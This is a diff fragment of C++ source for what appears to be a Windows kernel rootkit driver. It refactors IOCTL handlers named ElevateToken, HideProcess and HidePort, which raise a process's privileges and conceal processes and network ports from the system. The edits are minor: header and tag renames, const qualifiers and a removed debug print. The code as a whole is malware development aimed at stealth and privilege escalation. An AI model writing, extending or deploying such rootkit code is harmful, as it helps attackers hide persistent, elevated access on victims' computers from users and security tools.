@@ -3,15 +3,13 @@
 #include "Capabilities/ProcessCapabilities/ProcessHider.h"
 #include "Capabilities/TokenCapabilities/TokenElevator.h"
 #include "NetworkHandler.h"
-#include "Venom.h"
+#include "Config.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	const auto stack = IoGetCurrentIrpStackLocation(Irp);
 
 	auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
-
-	DbgPrint("Token Elevator: Received pid %lu", *pid);
 
 	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
@@ -47,7 +45,7 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 
 NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
-	auto stack = IoGetCurrentIrpStackLocation(Irp);
+	const auto stack = IoGetCurrentIrpStackLocation(Irp);
 	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
 
 	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
@@ -57,7 +55,7 @@ NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
 
 	//Add the desired port to the list of hidden ports.
 	auto size = sizeof(NetworkHandler::HiddenPort);
-	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, DRIVER_TAG);
+	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, POOL_TAG);
 
 	if (portToHide == nullptr)
 	{
